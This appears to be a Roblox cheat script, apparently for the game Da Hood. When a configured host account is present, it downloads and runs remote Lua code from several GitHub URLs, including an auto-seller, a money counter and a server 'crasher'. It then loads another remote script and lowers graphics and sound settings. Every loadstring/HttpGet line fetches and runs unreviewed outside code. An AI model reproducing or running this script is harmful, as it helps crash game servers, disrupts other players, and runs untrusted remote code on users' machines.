local ID = game.Players.LocalPlayer.UserId

--I spammed the detection cuz it gave errors so dont blame me.





--simple seller
if ID == getgenv().Settings.host then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/W9K/roblox-scripts/main/DHC/SimpleSeller.lua', true))()
end

wait(2)

--cash counter
if ID == getgenv().Settings.host then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/OG5/IkuScripts/main/DH/MoneyCounter', true))()
end

--crash
if ID == getgenv().Settings.host then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()

end
for i, v in pairs(game.Workspace:GetDescendants()) do
    if v:IsA("Part") then
        v.Material = Enum.Material.SmoothPlastic
    end
end  

loadstring(game:HttpGet('https://raw.githubusercontent.com/W9K/roblox-scripts/main/fpsshit.lua', true))()

settings().Physics.PhysicsEnvironmentalThrottle = 1
settings().Rendering.QualityLevel = 'Level01'
UserSettings():GetService('UserGameSettings').MasterVolume = 0
